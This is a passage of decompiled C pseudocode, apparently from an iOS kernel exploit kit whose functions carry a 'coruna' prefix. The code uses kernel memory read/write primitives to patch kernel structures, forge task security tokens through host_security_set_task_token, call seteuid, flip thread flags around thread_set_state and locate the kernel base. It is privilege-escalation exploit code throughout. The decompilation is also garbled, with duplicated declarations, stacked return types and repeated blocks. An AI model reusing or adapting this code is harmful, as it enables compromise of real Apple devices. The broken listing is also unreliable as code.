  else {
    size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + 0x92,1,&bootargs);
    if ((int)size == 0) {
      return size;
    }
    if (bootargs != kind) {
      thread_attr = (uint8_t)id_2;
      size = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle + 0x92,&thread_attr,1);
      if ((int)size == 0) {
        return size;
      }
      if (kind != 0) {
        size = coruna_kernel600c_residual_228(handle,handle + *(int *)(handle + 0x168),&scratch);
        if ((int)size == 0) {
          return size;
        }
        ptr = *(void **)(&k_kernel_slot_1d30 + handle);
        if (ptr == (void *)0x0) {
          coruna_return_zero_2d754(handle,0,0,0);
          if (*(int *)(&k_kernel_slot_18a0 + handle) != 0) {
            type_id = 0;
            do {
              addr = handle + type_id * 0x18;
              off = *(long *)(&k_kernel_slot_1a10 + addr);
              type_id_9 = *(unsigned long *)(&k_kernel_slot_1a18 + addr);
              addr = coruna_ptr_canonicalize(handle,off);
              if (addr != 0 && type_id_9 != 0) {
                err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,off + 8,8,&stack_guard);
                if (err == 0) {
                  return 0;
                }
                if (coruna_u64_pack71((scratch), (stack_guard)) == 0x6f74616c75676572) {
                  type_id_8 = 0;
                  do {
                    addr = type_id_8 + off;
                    err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr,&block_ctx);
                    if (err == 0) break;
                    if (block_ctx == -0x1120531) {
                      if (addr == 0) {
                        return 0;
                      }
                      ptr = _calloc(0x128,1);
                      if (ptr == (void *)0x0) {
                        return 0;
                      }
                      coruna_ctx_clear_1090c(ptr,handle);
                      size = *(uint64_t *)(handle + 0x140);
                      type_id_11 = *(uint64_t *)(handle + 0x158);
                      type_id_10 = *(uint64_t *)(handle + 0x150);
                      *(uint64_t *)((long)ptr + 0x78) = *(uint64_t *)(handle + 0x148);
                      *(uint64_t *)((long)ptr + 0x70) = size;
                      *(uint64_t *)((long)ptr + 0x88) = type_id_11;
                      *(uint64_t *)((long)ptr + 0x80) = type_id_10;
                      *(uint64_t *)((long)ptr + 0x90) = *(uint64_t *)(handle + 0x160);
                      *(uint32_t *)((long)ptr + 0x98) = *(uint32_t *)(handle + 0x178);
                      *(uint32_t *)((long)ptr + 0x38) = *(uint32_t *)(handle + 0x180);
                      err = coruna_call_find_text_exec_1305c(ptr,0,addr,0);
                      if (err == 0) {
                        return 0;
                      }
                      *(void **)(&k_kernel_slot_1d30 + handle) = ptr;
                      coruna_macho_text_sect(serial_buf,ptr);
                      addr = coruna_strsep(serial_buf,"68 02 08 CB 1F 20 03 D5",0,1);
                      if (addr == 0) {
                      return 0;
                      }
                      off = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + -8);
                      if (off == 0) {
                      return 0;
                      }
                      off = coruna_kernel600c_trampoline_00012ad4(*(uint64_t *)(&k_kernel_slot_1d30 + handle),off);
                      base = coruna_ptr_canonicalize(handle,off);
                      if (base == 0) {
                      return 0;
                      }
                      addr = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + 4);
                      if (addr == 0) {
                      return 0;
                      }
                      addr = coruna_kernel600c_trampoline_00012ad4(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr);
                      if (addr == 0) {
                      return 0;
                      }
                      addr = off + ((unsigned long)(scratch - addr) >> 10 & 0x3ffffffffffff0) + 9;
                      err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,addr,1,&action);
                      if (err == 0) {
                      return 0;
                      }
                      if ((action & 1) == 0) {
                      action = action | 1;
                      err = coruna_vm_deallocate(handle,addr,&action,1);
                      if (err == 0) {
                      return 0;
                      }
                      }
                      }
                      }
                      size = coruna_kernel600c_residual_228(handle,handle + 0xb0,serial_buf);
                      if ((int)size == 0) {
                      return size;
                      }
                      handle = coruna_ptr_canonicalize(handle,serial_buf[0]);
                      if (handle == 0) {
                      return 0;
                      }
                      size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,serial_buf[0] + 0x20,1,&stack_guard);
                      if ((int)size == 0) {
                      return size;
                      }
                      thread_attr = (uint8_t)arg;
                      if (stack_guard != tag) {
                      size = coruna_vm_deallocate(handle,serial_buf[0] + 0x20,&thread_attr,1);
                      err = (int)size;
                      joined_r0x00030124:
                      if (err == 0) {
                      return size;
                    }
                    type_id_8 = type_id_8 + *(uint *)(handle + 0x180);
                  } while (type_id_8 < type_id_9);
                }
              }
              type_id = type_id + 1;
            } while (type_id < *(uint *)(&k_kernel_slot_18a0 + handle));
          }
          return 0;
        }
cleanup:
        coruna_macho_text_sect(serial_buf,ptr);
        addr = coruna_strsep(serial_buf,"68 02 08 CB 1F 20 03 D5",0,1);
        if (addr == 0) {
          return 0;
        }
        off = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + -8);
        if (off == 0) {
          return 0;
        }
        off = coruna_kernel600c_trampoline_00012ad4(*(uint64_t *)(&k_kernel_slot_1d30 + handle),off);
        base = coruna_ptr_canonicalize(handle,off);
        if (base == 0) {
          return 0;
        }
        addr = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + 4);
        if (addr == 0) {
          return 0;
        }
        addr = coruna_kernel600c_trampoline_00012ad4(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr);
        if (addr == 0) {
          return 0;
        }
        addr = off + ((unsigned long)(scratch - addr) >> 10 & 0x3ffffffffffff0) + 9;
        err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,addr,1,&action);
        if (err == 0) {
          return 0;
        }
        if ((action & 1) == 0) {
          action = action | 1;
          err = coruna_vm_deallocate(handle,addr,&action,1);
          if (err == 0) {
            return 0;
          }
        }
      }
    }
    size = coruna_kernel600c_residual_228(handle,handle + 0xb0,serial_buf);
    if ((int)size == 0) {
      return size;
    }
    handle = coruna_ptr_canonicalize(handle,serial_buf[0]);
    if (handle == 0) {
      return 0;
    }
    size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,serial_buf[0] + 0x20,1,&stack_guard);
    if ((int)size == 0) {
      return size;
    }
    thread_attr = (uint8_t)arg;
    if (stack_guard != tag) {
      size = coruna_vm_deallocate(handle,serial_buf[0] + 0x20,&thread_attr,1);
      err = (int)size;
joined_r0x00030124:
      if (err == 0) {
        return size;
      }
    }
  }
  if (*(double *)k_kernel_dyldversionnumber_slot < k_kernel_rodata_word_377d0) {
    return 1;
  }
  size = coruna_kernel600c_via_kernel600c_via_mach_vm_machine_attribute_2(handle,val,arg);
  err = (int)size;
joined_r0x00030328:
  if (err != 0) {
    return 1;
  }
  return size;
}





uint64_t coruna_kernel600c_via_kernel600c_via_mach_vm_machine_attribute_2(uint64_t val,uint64_t id_2,int flags)
{
  long handle;
  uint64_t u;
  uint size;
  uint scratch;
  
  handle = coruna_return_zero_29d20();
  u = 0;
  if ((handle != 0) && (u = coruna_kernel600c_via_kernel600c_via_fd_read_full(val,handle,&scratch), (int)u != 0)) {
    size = 0x80;
    if (flags == 0) {
      size = 0;
    }
    if (((scratch & 0xffffff7f | size) == scratch) ||
       (u = coruna_kernel600c_via_mach_vm_machine_attribute(val,handle), (int)u != 0)) {
      u = 1;
    }
  }
  return u;
}





uint64_t
void coruna_return_zero_3043c(long handle,uint64_t val,uint8_t *buf,uint8_t *data_2,
            uint8_t *bytes_3)
{
  bool err;
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  unsigned long size;
  char scratch;
  long bootargs;
  uint thread_attr;
  
  thread_attr = 0;
  handle = coruna_kernel600c_via_return_zero_293c0_2();
  if (handle == 0) {
    return 0;
  }
  err = coruna_ctx_test_flag(handle,0x20);
  if (err != 0) {
    err = coruna_kernel600c_residual_228(handle,handle + 0xb0,&bootargs);
    if (err == 0) {
      return 0;
    }
    handle = coruna_ptr_canonicalize(handle,bootargs);
    if (handle == 0) {
      return 0;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,bootargs + 0x20,1,&scratch);
    if (err == 0) {
      return 0;
    }
    *data_2 = scratch != '\0';
    *bytes_3 = 0;
    *buf = 1;
    return 1;
  }
  err = coruna_ctx_test_flag(handle,0x5184001);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x200);
    if (err == 0) {
      return 0;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err < 0x1f53) {
        if (err < 0x1c1b) {
          if (err < 0x1809) {
            return 0;
          }
          off = 0xe7;
          if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
            off = 0xef;
          }
        }
        else {
          off = 0xdf;
        }
      }
      else {
        off = 0x97;
      }
    }
    else {
      off = 0x8f;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,off + handle,1,&thread_attr);
    if (err != 0) {
      *bytes_3 = (char)thread_attr != '\0';
      *data_2 = 0;
      *buf = 0;
      return 1;
    }
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2712) {
    if (err < 0x2258) {
      if (0x1f52 < err) {
        u = 0x180000;
        err = coruna_ctx_test_flag(handle,u);
        err = err == 0;
        addr = 199;
        off = 0xbf;
        }
        if (!err) {
        off = addr;
        }
        done:
        err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,off + handle,&thread_attr);
        if (err == 0) {
        return 0;
      }
      if (err < 0x1c1b) {
        off = 0x107;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
          off = 0x10f;
        }
        err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,off + handle,&thread_attr);
        if (err == 0) {
        return 0;
        }
        size = *(unsigned long *)(handle + 0x158);
        *bytes_3 = (thread_attr & 0xff) != 0;
        if (size < 0x1c1b0a80100000) {
        *buf = (thread_attr & 0xff00) != 0;
        thread_attr = thread_attr & 0xff0000;
        }
        else {
        *buf = (thread_attr & 0xff0000) != 0;
        thread_attr = thread_attr >> 0x18;
        }
        *data_2 = thread_attr != 0;
        return 1;
      }
      err = coruna_ctx_test_flag(handle,0x80000);
      err = err == 0;
      addr = 0x107;
      off = 0xff;
    }
    else {
      err = coruna_ctx_test_flag(handle,0x1180000);
      err = err == 0;
      addr = 0xbf;
      off = 0xb7;
    }
  }
  else {
    u = 0x1180000;
fail:
    err = coruna_ctx_test_flag(handle,u);
    err = err == 0;
    addr = 199;
    off = 0xbf;
  }
  if (!err) {
    off = addr;
  }
done:
  err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,off + handle,&thread_attr);
  if (err == 0) {
    return 0;
  }
  size = *(unsigned long *)(handle + 0x158);
  *bytes_3 = (thread_attr & 0xff) != 0;
  if (size < 0x1c1b0a80100000) {
    *buf = (thread_attr & 0xff00) != 0;
    thread_attr = thread_attr & 0xff0000;
  }
  else {
    *buf = (thread_attr & 0xff0000) != 0;
    thread_attr = thread_attr >> 0x18;
  }
  *data_2 = thread_attr != 0;
  return 1;
}





unsigned long coruna_host_security_set_task_token(uint *arg,uint64_t val,uint64_t n)

{
  host_security_t host_security;
  bool i;
  uint8_t *buf;
  kern_return_t lk3;
  int err;
  long serial_13;
  unsigned long type_id_13;
  long serial_18;
  long serial_17;
  long serial_10;
  uint32_t type_id_16;
  host_t host;
  uid_t tag;
  host_t cache_71;
  audit_token_t cache_47;
  mach_msg_type_number_t cache_93;
  uint32_t cache_84;
  uint cache_27 [2];
  uint cache_74 [2];
  uint cache_51 [2];
  uint cache_75 [2];
  security_token_t cache_28;
  uint32_t cache_77;
  uid_t cache_31;
  task_t task;
  
  task = (task_t)val;
  lk3 = _task_get_special_port(task,2,&cache_71);
  buf = k_kernel_mach_task_self_slot;
  if (lk3 != 0) {
    return 0;
  }
  host = (host_t)n;
  if (cache_71 == host) {
    return 1;
  }
  if ((*arg & 0x5584001) == 0) {
    type_id_13 = coruna_iosurface_field_read(arg);
    if ((int)type_id_13 == 0) {
      return type_id_13;
    }
    serial_13 = coruna_kernel600c_via_return_zero_28118(arg,val);
    if (serial_13 == 0) {
      return 0;
    }
    serial_13 = serial_13 + (type_id_13 & 0xffffffff);
    type_id_13 = coruna_kernel600c_residual_228(arg,serial_13,cache_27);
    if ((int)type_id_13 == 0) {
      return type_id_13;
    }
    serial_18 = coruna_ptr_canonicalize(arg,cache_27);
    if (serial_18 != 0) {
      if (host + 1 < 2) {
        serial_18 = -(unsigned long)(host == 0xffffffff);
      }
      else {
        serial_18 = coruna_ret_stub_2(arg,n);
        if (serial_18 == 0) {
          return 0;
        }
        err = coruna_kernel600c_via_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_2(arg,serial_18);
        if (err != 0) {
          return 0;
        }
      }
      err = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(arg,serial_13,serial_18);
      return (unsigned long)(err != 0);
    }
    return 0;
  }
  if (*(unsigned long *)(arg + 0x56) < 0x1f530000000000) {
    host_security = arg[0x649];
    cache_93 = 2;
    lk3 = _task_info(task,0xd,(task_info_t)&cache_28,&cache_93);
    if (lk3 == 0) {
      cache_93 = 8;
      lk3 = _task_info(task,0xf,(task_info_t)cache_27,&cache_93);
      if (lk3 == 0) {
        cache_47.val[2] = cache_74[0];
        cache_47.val[3] = cache_74[1];
        cache_47.val[0] = cache_27[0];
        cache_47.val[1] = cache_27[1];
        cache_47.val[6] = cache_75[0];
        cache_47.val[7] = cache_75[1];
        cache_47.val[4] = cache_51[0];
        cache_47.val[5] = cache_51[1];
        lk3 = _host_security_set_task_token(host_security,task,cache_28,&cache_47,host);
        return (unsigned long)(lk3 == 0);
      }
    }
  }
  else if (*(task_t *)k_kernel_mach_task_self_slot == task) {
    cache_47.val[0] = 2;
    lk3 = _task_info(task,0xd,(task_info_t)&cache_28,cache_47.val);
    if (lk3 == 0) {
      cache_47.val[0] = 8;
      lk3 = _task_info(task,0xf,(task_info_t)cache_27,cache_47.val);
      if (lk3 == 0) {
        serial_13 = coruna_kernel600c_via_return_zero_295bc(arg,val);
        if (serial_13 == 0) {
          return 0;
        }
        type_id_13 = coruna_kernel600c_via_kernel600c_via_fd_read_full_2(arg,serial_13,&cache_47);
        if ((int)type_id_13 == 0) {
          return type_id_13;
        }
        serial_18 = coruna_kernel600c_via_ctx_test_flag_8(arg,cache_47.val);
        serial_17 = coruna_ptr_canonicalize(arg,serial_18);
        if (serial_17 == 0) {
          return 0;
        }
        serial_17 = serial_18 + 0x18;
        type_id_13 = coruna_kernel600c_via_kernel600c_via_fd_read_full(arg,serial_17,&cache_31);
        if ((int)type_id_13 == 0) {
          return type_id_13;
        }
        if ((0x1f530f027fffff < *(unsigned long *)(arg + 0x56)) &&
           (type_id_13 = coruna_kernel600c_via_kernel600c_via_fd_read_full(arg,serial_18 + 0x20,&cache_77), (int)type_id_13 == 0)) {
          return type_id_13;
        }
        if (arg[0x648] == host) {
          tag = 0;
          type_id_13 = *(unsigned long *)(arg + 0x56);
          i = 0x1f530f027fffff < type_id_13 && cache_31 == 0;
          type_id_16 = 0x1f5;
          if (0x1f530f027fffff >= type_id_13 || cache_31 != 0) {
            type_id_16 = 0;
          }
        }
        else {
          if (arg[0x64a] != host) {
            return 0;
          }
          type_id_16 = 0;
          type_id_13 = *(unsigned long *)(arg + 0x56);
          i = 0x1f530f027fffff < type_id_13 && cache_31 != 0;
          tag = cache_31;
        }
        if ((cache_31 != tag) || (i)) {
          if (type_id_13 < 0x1f530f02800000) {
            type_id_13 = coruna_mach_vm_machine_attribute(arg,serial_17,tag);
            err = (int)type_id_13;
          }
          else {
            if ((i) && (type_id_13 = coruna_kernel600c_via_mach_vm_machine_attribute(arg,serial_17,type_id_16), (int)type_id_13 == 0)) {
              return type_id_13;
            }
            type_id_13 = coruna_kernel600c_via_mach_vm_machine_attribute(arg,serial_18 + 0x20,tag);
            err = (int)type_id_13;
          }
          if (err == 0) {
            return type_id_13;
          }
        }
        type_id_13 = coruna_kernel600c_via_kernel600c_via_ptr_canonicalize_5(arg,*(uint32_t *)buf);
        if ((int)type_id_13 == 0) {
          return type_id_13;
        }
        if ((*(unsigned long *)(arg + 0x56) < 0x1f530f02800000) ||
           (err = coruna_kernel600c_via_return_zero_2b4e0(arg,serial_18), err == 0)) {
          serial_10 = coruna_ptr_canonicalize(arg,*(uint64_t *)(arg + 0xe6));
          if ((serial_10 != 0) && (type_id_13 = coruna_pthread_attr_setdetachstate(arg,arg[0xdf],0), (int)type_id_13 == 0)) {
            return type_id_13;
          }
          err = _seteuid(tag);
          if ((err == 0) &&
             ((*(unsigned long *)(arg + 0x56) < 0x1f530f02800000 ||
              ((err = coruna_kernel600c_via_kernel600c_via_fd_read_full_2(arg,serial_13,&cache_93), err != 0 &&
               ((coruna_u64_pack((cache_84), (cache_93)) == cache_47.val ||
                (err = coruna_kernel600c_via_mach_vm_machine_attribute_1e63c(arg,serial_13), err != 0)))))))) {
            serial_13 = coruna_ptr_canonicalize(arg,*(uint64_t *)(arg + 0xe6));
            if ((serial_13 != 0) &&
               (type_id_13 = coruna_pthread_attr_setdetachstate(arg,arg[0xdf],*(uint64_t *)(arg + 0xea)),
               (int)type_id_13 == 0)) {
              return type_id_13;
            }
            if (cache_31 != tag || i) {
              if (*(unsigned long *)(arg + 0x56) < 0x1f530f02800000) {
                type_id_13 = coruna_mach_vm_machine_attribute(arg,serial_17);
                err = (int)type_id_13;
              }
              else {
                if ((i) && (type_id_13 = coruna_kernel600c_via_mach_vm_machine_attribute(arg,serial_17), (int)type_id_13 == 0)) {
                  return type_id_13;
                }
                type_id_13 = coruna_kernel600c_via_mach_vm_machine_attribute(arg,serial_18 + 0x20,cache_77);
                err = (int)type_id_13;
              }
              if (err == 0) {
                return type_id_13;
              }
            }
            err = coruna_task_info_2ed58(arg,val,1,&cache_28,8);
            if ((err != 0) && (err = coruna_task_info_2ed58(arg,val,3,cache_27,0x20), err != 0))
            {
              return 1;
            }
          }
        }
      }
    }
  }
  return 0;
}





void coruna_call_macho_data_seg_2bb24_2bdb4_30b98(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_mach_port_mod_refs_30ba4(val,id_2,0,size_3);
  return;
}





bool coruna_mach_port_mod_refs_30ba4(long handle,uint64_t val,long addr_2,ipc_space_t *arg)
{
  ipc_space_t task;
  pid_t lp1;
  kern_return_t lk2;
  int err;
  long handle;
  unsigned long u;
  long addr;
  uint64_t scratch;
  
  if ((0 < (int)val) && (lp1 = _getpid(), lp1 == (int)val)) {
    task = *(ipc_space_t *)k_kernel_mach_task_self_slot;
    lk2 = _mach_port_mod_refs(task,task,0,1);
    if (lk2 != 0) {
      return false;
    }
    *arg = task;
    return true;
  }
  err = *(int *)(&k_kernel_slot_191c + handle);
  if (err == 0) {
    err = *(int *)(&k_kernel_slot_1918 + handle);
  }
  handle = coruna_kernel600c_via_return_zero_28118(handle,err);
  if (handle != 0) {
    if (addr_2 == 0) {
      handle = coruna_call_mach_vm_machine_attribute_29df8_28b40(handle,handle,val);
    }
    else {
      handle = coruna_call_macho_data_seg_2bb24_2bdb4(handle,handle,addr_2);
    }
    if (handle != 0) {
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (err - 0x1f53U < 2) {
          u = 0x1f530f027fffff;
          addr = 0xd0;
        }
        else {
          u = 0x1c1b19145fffff;
          addr = 0xf0;
          if ((err != 0x1809) && (err != 0x1c1b)) {
            return false;
          }
        }
        if (*(unsigned long *)(handle + 0x158) <= u) {
          addr = 0xf8;
        }
      }
      else {
        addr = 200;
        if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
          return false;
        }
      }
      err = coruna_kernel600c_residual_228(handle,addr + handle,&scratch);
      if ((err != 0) && (handle = coruna_ptr_canonicalize(handle,scratch), handle != 0)) {
        err = coruna_mach_port_request_notification(handle,scratch,arg);
        return err == 0;
      }
    }
  }
  return false;
}





bool coruna_mach_thread_self_30d48(uint *size,int flags,uint64_t val,uint64_t id_2,uint64_t size_3
                 ,uint64_t off_4)
{
  long handle;
  uint u;
  bool err;
  int err;
  mach_port_t lm5;
  int status;
  long addr;
  uint size;
  uint version;
  unsigned long port;
  uint32_t tag;
  uint kind;
  long scratch;
  long bootargs;
  uint thread_attr;
  
  if ((*(unsigned long *)(size + 0x56) < 0x1c1b0002e00000) ||
     ((*size & 0x5584001) == 0 || *(int *)k_kernel_mach_task_self_slot == flags)) {
    err = coruna_thread_set_state(size,val,id_2,size_3,off_4);
fail:
    err = err == 0;
  }
  else {
    thread_attr = 0;
    size = size[0x50];
    if ((int)size < 0x2258) {
      if (size - 0x1f53 < 2) {
done:
        err = coruna_ctx_test_flag(size,0x4000000);
        if (err == 0) {
          err = coruna_ctx_test_flag(size,0x1100000);
          if (err == 0) {
            err = coruna_ctx_test_flag(size,0x84000);
            if (err == 0) {
              err = coruna_ctx_test_flag(size,1);
              size = 0;
              if (err != 0) {
                size = 0x160;
              }
            }
            else {
              size = 0x168;
            }
          }
          else {
            size = 0x170;
          }
        }
        else {
          size = 0x1c0;
        }
        if ((int)size[0x50] < 0x2258) {
          version = size - 9;
          kind = 1;
          tag = 1;
        }
        else {
        size = size - 8;
        err = coruna_ctx_test_flag(size,1);
        if (err == 0) {
          err = coruna_ctx_test_flag(size,0x4000000);
          version = 0xec;
          if (err != 0) {
            version = 0x13c;
          }
          tag = 4;
          kind = 2;
        }
        else {
          tag = 4;
          kind = 2;
          version = 0xe4;
        }
        }
      }
      else {
        if (size == 0x1c1b) {
          err = coruna_ctx_test_flag(size,0x80000);
          if (err == 0) {
            err = coruna_ctx_test_flag(size,0x4000);
            if (err != 0) {
              port = *(unsigned long *)(size + 0x56);
              version = 0x510;
              size = 0x168;
            }
            else {
              err = coruna_ctx_test_flag(size,1);
              if (err == 0) {
                size = 0;
              }
              else {
                port = *(unsigned long *)(size + 0x56);
                version = 0x508;
                size = 0x160;
              }
            }
          }
          else {
            port = *(unsigned long *)(size + 0x56);
            version = 0x518;
            size = 0x168;
          }
          if (port < 0x1c1b1914600000) {
            size = version;
          }
          version = size - 9;
          kind = 1;
          tag = 1;
        }
      }
      if (size != 0) {
        lm5 = _mach_thread_self();
        addr = coruna_kernel600c_via_return_zero_28118(size,lm5);
        if (addr != 0) {
          bootargs = 0;
          err = coruna_call_mach_vm_machine_attribute_29df8_1d654(size,addr + (unsigned long)size,8,&bootargs);
          if (((err != 0) &&
              (err = coruna_call_mach_vm_machine_attribute_29df8_1d654(size,addr + (unsigned long)version,tag,&thread_attr), u = thread_attr
              , err != 0)) && (addr = coruna_kernel600c_via_return_zero_28118(size,val), addr != 0)) {
            scratch = 0;
            handle = addr + (unsigned long)size;
            err = coruna_call_mach_vm_machine_attribute_29df8_1d654(size,handle,8,&scratch);
            if (err != 0) {
              addr = addr + (unsigned long)version;
              err = coruna_call_mach_vm_machine_attribute_29df8_1d654(size,addr,tag,&thread_attr);
              size = thread_attr;
              if ((err != 0) &&
                 ((bootargs == scratch ||
                  (err = coruna_call_mach_vm_machine_attribute_29df8_21874(size,handle,&bootargs,8), err != 0)))) {
                if (((u & kind) == 0) || ((size & kind) != 0)) {
                  err = coruna_thread_set_state(size,val,id_2,size_3,off_4);
next:
                  if ((bootargs == scratch) ||
                     (status = coruna_call_mach_vm_machine_attribute_29df8_21874(size,handle,&scratch,8), status != 0))
                  goto fail;
                }
                else {
                  thread_attr = thread_attr & (kind ^ 0xffffffff) | u & kind;
                  err = coruna_call_mach_vm_machine_attribute_29df8_21874(size,addr,&thread_attr,tag);
                  if (err != 0) {
                    err = coruna_thread_set_state(size,val,id_2,size_3,off_4);
                    thread_attr = thread_attr & ~kind;
                    status = coruna_call_mach_vm_machine_attribute_29df8_21874(size,addr,&thread_attr,tag);
                    if (status != 0) goto next;
                  }
                }
              }
            }
          }
        }
      }
    }
    else if (((size == 0x2258) || (size == 0x225c)) || (size == 0x2712)) goto done;
check_ok:
    err = false;
  }
  return err;
}





kern_return_t
void coruna_thread_set_state(long handle,uint64_t val,thread_state_flavor_t arg,thread_state_t arg_x,
            mach_msg_type_number_t arg_x_x)
{
  int err;
  int status;
  kern_return_t lk3;
  long handle;
  long addr;
  ushort scratch;
  ushort bootargs;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    handle = 0;
fail:
    lk3 = _thread_set_state((thread_act_t)val,arg,arg_x,arg_x_x);
    if (err < 0x225c) {
      return lk3;
    }
    if (-1 < (short)bootargs) {
      coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle,&bootargs,2);
      return lk3;
    }
    return lk3;
  }
  status = coruna_ctx_test_flag(handle,0x4000000);
  if (status == 0) {
    status = coruna_ctx_test_flag(handle,0x5584201);
    addr = 0xb8;
    if (status != 0) {
      addr = 0x70;
    }
  }
  else {
    addr = 0xc0;
  }
  handle = coruna_kernel600c_via_return_zero_28118(handle,val);
  if (handle != 0) {
    handle = handle + addr;
    status = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle,2,&bootargs);
    if (status != 0) {
      if (-1 < (short)bootargs) {
        scratch = bootargs | 0x8000;
        status = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle,&scratch,2);
        if (status == 0) {
          return 5;
        }
      }
      lk3 = _thread_set_state((thread_act_t)val,arg,arg_x,arg_x_x);
      if (err < 0x225c) {
      return lk3;
      }
      if (-1 < (short)bootargs) {
      coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle,&bootargs,2);
      return lk3;
      }
      return lk3;
    }
  }
  return 5;
}





uint64_t coruna_kernel600c_via_ctx_test_flag_15(long handle)
{
  bool err;
  int err;
  uint64_t u;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  u = 0;
  if (err || err == status) {
    err = coruna_ctx_test_flag(handle,0x20);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,8);
      u = 0xfffffff007004000;
      if (err != 0) {
        u = 0xfffffe0007004000;
      }
    }
    else {
      u = 0xfffffff027004000;
    }
  }
  return u;
}
uint64_t coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_5(long handle,int flags,uint size,char *path)
{
  int err;
  long handle;
  long addr;
  uint u;
  uint size;
  uint64_t version;
  long off;
  unsigned long port;
  int scratch;
  long bootargs;
  uint thread_attr;
  int host_info;
  long serial_buf;
  uint64_t action;
  uint64_t scratch;
  uint64_t block_ctx;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t sa_saved;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t tmp_buf;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t region;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t plist;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t url_buf;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t json_buf;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t frame;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t work;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t cache_20;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache_21;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_22;
  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_47;
  long cache_23;
  
  cache_23 = *(long *)k_kernel_stack_chk_guard_slot;
  version = 0x2800f;
  serial_buf = 0;
  handle = coruna_kernel600c_via_return_zero_28118();
  bootargs = 0;
  if (handle == 0) {
    version = 0x2800e;
    if (*(long *)k_kernel_stack_chk_guard_slot != cache_23) {
    ___stack_chk_fail();
    }
    return version;
  }
  port = *(unsigned long *)(handle + 0x158);
  err = *(int *)(handle + 0x140);
  if (0x1f530f027fffff < port) {
    scratch = 0;
    if ((err == 0x2258 || err == 0x2712) || err == 0x225c) {
      scratch = 0x48;
    }
    port = coruna_return_zero_287d4(handle);
    err = coruna_kernel600c_residual_228(handle,handle + (port & 0xffffffff),&bootargs);
    if (*(long *)k_kernel_stack_chk_guard_slot != cache_23) {
    ___stack_chk_fail();
    }
    return version;
  }
  if (err == 0x1f53) {
    err = coruna_ctx_test_flag(handle,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5584001);
      u = 0x3d0;
      if (err != 0) {
        u = 1000;
      }
    }
    else {
      u = 0x3f8;
    }
  }
  else {
    if (err != 0x1c1b) {
      version = 0x28007;
      if (*(long *)k_kernel_stack_chk_guard_slot != cache_23) {
      ___stack_chk_fail();
      }
      return version;
    }
    err = coruna_ctx_test_flag(handle,0x5584001);
    u = 0x3c0;
    if (err != 0) {
      u = 0x3d0;
    }
    size = 0x3c8;
    if (err != 0) {
      size = 0x3e0;
    }
    if (0x1c1b19145fffff < port) {
      u = size;
    }
  }
  off = handle + (unsigned long)u;
  err = coruna_kernel600c_residual_228(handle,off,&serial_buf);
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_23) {
  ___stack_chk_fail();
  }
  return version;
}





uint64_t coruna_kernel600c_via_return_zero_287d4(long handle,uint64_t val)
{
  int err;
  int status;
  long handle;
